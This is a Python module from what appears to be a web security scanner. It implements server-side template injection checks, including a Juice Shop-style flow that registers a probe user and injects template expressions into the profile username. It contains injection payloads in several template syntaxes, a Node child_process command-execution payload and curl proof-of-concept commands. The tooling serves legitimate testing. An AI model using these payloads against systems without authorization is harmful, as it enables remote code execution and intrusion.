"""
SSTI + Eval-based RCE check — differential testing to eliminate false positives.

Strategy for each probe:
  1. Get BASELINE response at the render endpoint
  2. Inject payload
  3. Re-fetch render endpoint
  4. Flag only if result appears in POST-injection response but NOT in baseline

Authenticated flow (for profile/username eval):
  - Registers a throwaway user
  - Sets username to #{expr}
  - GETs /profile to check rendered output
"""
import re
import uuid
import random
import asyncio
from typing import Optional
from urllib.parse import urlparse

import httpx

from nexus.models import (
    CheckResult,
    CheckType,
    Confidence,
    InsertionPoint,
    IPType,
    Severity,
)
from .base import BaseScanCheck

# Use large unique numbers to minimise collisions with page content
def _canary() -> tuple[str, str]:
    """Returns (expression, expected_result) where result is unlikely to appear by chance."""
    # Use 5-digit primes to reduce collision probability
    _PRIMES = [10007, 10009, 10037, 10039, 10061, 10067, 10069, 10079, 10091, 10093]
    a, b = random.choice(_PRIMES), random.choice(_PRIMES)
    expr = f"{a}*{b}"
    result = str(a * b)  # ~10-digit number, extremely unlikely to collide
    return expr, result


# Template patterns to test
_SSTI_TEMPLATES = [
    ("#{EXPR}",          "node-eval"),    # Juice Shop / Pug
    ("{{EXPR}}",         "jinja2"),
    ("${EXPR}",          "mako/el"),
    ("<%= EXPR %>",      "erb"),
    ("%{EXPR}",          "ognl"),
]

# Endpoints that render user-controlled profile content
_RENDER_ENDPOINTS = ["/profile", "/me", "/user/me", "/account", "/user/profile"]


class SstiProfileCheck(BaseScanCheck):
    """
    Targeted check for eval()-based RCE via the username/profile field.

    Flow:
    1. Register throwaway user
    2. Login → get token (cookie)
    3. POST /profile with username=#{expr} (form-encoded)
    4. GET /profile — compare against baseline
    5. If expected result appears after injection but not before → CONFIRMED RCE
    """
    check_id = "ssti-profile-eval"
    check_type = CheckType.ACTIVE
    name = "Profile Username Eval RCE"
    description = "Detects eval() RCE via #{expression} in username profile field"

    _attempted: bool = False  # only run once per scan session

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        # Trigger only on the first profile-like insertion point we see
        url_lower = insertion_point.url.lower()
        name_lower = insertion_point.name.lower()

        is_register = any(k in url_lower for k in ("/api/users", "/register", "/signup"))
        is_name_field = any(k in name_lower for k in ("username", "name"))

        if not (is_register and is_name_field):
            return []

        if getattr(self.__class__, '_attempted', False):
            return []
        self.__class__._attempted = True

        parsed = urlparse(insertion_point.url)
        base = f"{parsed.scheme}://{parsed.netloc}"

        expr, expected = _canary()

        # Step 1: Register throwaway user
        import string
        uid = uuid.uuid4().hex[:8]
        email = f"nexus_probe_{uid}@nexus-scanner.invalid"
        password = "NexusP@ss1!"

        try:
            reg = await client.post(
                f"{base}/api/Users",
                json={"email": email, "password": password,
                      "passwordRepeat": password, "username": "nexus_baseline",
                      "securityQuestion": {"id": 1}, "securityAnswer": "probe"},
                headers={"Content-Type": "application/json"},
            )
            if reg.status_code not in (200, 201):
                return []
        except Exception:
            return []

        # Step 2: Login → get token
        try:
            login = await client.post(
                f"{base}/rest/user/login",
                json={"email": email, "password": password},
                headers={"Content-Type": "application/json"},
            )
            if login.status_code != 200:
                return []
            token = login.json().get("authentication", {}).get("token", "")
            if not token:
                return []
            cookie_hdr = {"Cookie": f"token={token}"}
        except Exception:
            return []

        # Step 3: Capture baseline render of /profile
        try:
            baseline = await client.get(f"{base}/profile", headers=cookie_hdr)
            baseline_body = baseline.text
        except Exception:
            baseline_body = ""

        # Sanity check: expected result should NOT be in baseline
        if expected in baseline_body:
            # Try a different expr
            expr, expected = _canary()
            if expected in baseline_body:
                return []  # Can't distinguish — skip

        # Step 4: Try each template pattern
        for template, engine_hint in _SSTI_TEMPLATES:
            payload = template.replace("EXPR", expr)

            try:
                inject = await client.post(
                    f"{base}/profile",
                    data={"username": payload},
                    headers={**cookie_hdr, "Content-Type": "application/x-www-form-urlencoded"},
                    follow_redirects=False,
                )
            except Exception:
                continue

            # Step 5: Fetch rendered profile
            try:
                render = await client.get(f"{base}/profile", headers=cookie_hdr)
            except Exception:
                continue

            if expected in render.text and expected not in baseline_body:
                req_raw = (
                    f"POST /profile HTTP/1.1\nHost: {parsed.netloc}\n"
                    f"Content-Type: application/x-www-form-urlencoded\n"
                    f"Cookie: token=<TOKEN>\n\nusername={payload}"
                )
                curl = (
                    f"# 1. Register user, login, get token cookie\n"
                    f"# 2. Set malicious username:\n"
                    f"curl -s -X POST -b 'token=TOKEN' "
                    f"-d 'username={payload}' '{base}/profile'\n"
                    f"# 3. Render profile page (see RCE output):\n"
                    f"curl -s -b 'token=TOKEN' '{base}/profile'"
                )

                evidence = self._make_evidence(
                    request_raw=req_raw,
                    response=render,
                    payload=payload,
                    poc_curl=curl,
                )

                full_rce_payload = "#{require('child_process').execSync('id').toString()}"
                return [CheckResult(
                    check_id=self.check_id,
                    vulnerable=True,
                    confidence=Confidence.CERTAIN,
                    severity=Severity.CRITICAL,
                    cvss=9.8,
                    description=(
                        f"**REMOTE CODE EXECUTION** via {engine_hint} eval in username field. "
                        f"Expression {payload!r} evaluated to {expected!r} in rendered profile page. "
                        f"Full RCE PoC: set username to: {full_rce_payload}"
                    ),
                    evidence=evidence,
                    insertion_point=insertion_point,
                )]

        return []


class SstiGenericCheck(BaseScanCheck):
    """
    Generic SSTI check using differential baseline testing.
    Avoids false positives by comparing against baseline response.
    """
    check_id = "ssti-generic"
    check_type = CheckType.ACTIVE
    name = "Server-Side Template Injection (Generic)"
    description = "Detects SSTI via arithmetic canary with differential baseline comparison"

    async def check_active(
        self,
        insertion_point: InsertionPoint,
        client: httpx.AsyncClient,
    ) -> list[CheckResult]:
        if insertion_point.ip_type not in (IPType.QUERY_PARAM, IPType.BODY_PARAM, IPType.JSON_KEY):
            return []

        # Skip if endpoint looks like a static or API-only endpoint
        url_lower = insertion_point.url.lower()
        if any(ext in url_lower for ext in (".js", ".css", ".png", ".jpg", ".woff")):
            return []

        expr, expected = _canary()

        # Step 1: Baseline
        try:
            baseline = await self._send_probe(client, insertion_point, insertion_point.value or "test")
            baseline_body = baseline.text
        except Exception:
            baseline_body = ""

        # Content-Type gate: SSTI is only meaningful in template-rendered HTML.
        # Pure JSON APIs don't render templates — skip to avoid false positives.
        try:
            _ct = baseline.headers.get("content-type", "")
            if _ct and self._ct_is_json(_ct) and not self._ct_is_html(_ct):
                return []
        except Exception:
            pass

        if expected in baseline_body:
            # Collision — try different canary
            expr, expected = _canary()
            if expected in baseline_body:
                return []

        for template, engine_hint in _SSTI_TEMPLATES:
            payload = template.replace("EXPR", expr)

            try:
                inject_resp = await self._send_probe(client, insertion_point, payload)
            except Exception:
                continue

            if expected in inject_resp.text and expected not in baseline_body:
                # Confirm it's not in the URL/params echoed back literally
                if payload.replace("EXPR", "").replace(expr, "") in inject_resp.text:
                    continue  # literal echo, not evaluation

                req_raw = self._build_request_line(
                    insertion_point.method.upper(), insertion_point.url, {}
                )
                curl = self._poc_curl(insertion_point.method.upper(), insertion_point.url)
                evidence = self._make_evidence(
                    request_raw=req_raw,
                    response=inject_resp,
                    payload=payload,
                    poc_curl=curl,
                )
                return [CheckResult(
                    check_id=self.check_id,
                    vulnerable=True,
                    confidence=Confidence.FIRM,
                    severity=Severity.CRITICAL,
                    cvss=9.8,
                    description=(
                        f"SSTI detected ({engine_hint}): expression {payload!r} "
                        f"evaluated to {expected!r} (not present in baseline). "
                        f"Parameter: {insertion_point.name!r}"
                    ),
                    evidence=evidence,
                    insertion_point=insertion_point,
                )]

        return []

    async def _send_probe(
        self,
        client: httpx.AsyncClient,
        ip: InsertionPoint,
        payload: str,
    ) -> httpx.Response:
        method = ip.method.upper()

        if ip.ip_type == IPType.QUERY_PARAM:
            url = self._build_url(ip, payload)
            return await client.get(url)
        elif ip.ip_type in (IPType.BODY_PARAM,):
            return await client.post(ip.url, data={ip.name: payload})
        elif ip.ip_type == IPType.JSON_KEY:
            return await client.post(ip.url, json={ip.name: payload},
                                     headers={"Content-Type": "application/json"})
        else:
            raise ValueError(f"Unsupported: {ip.ip_type}")


# Keep old name as alias for backwards compat with __init__
SstiCheck = SstiGenericCheck
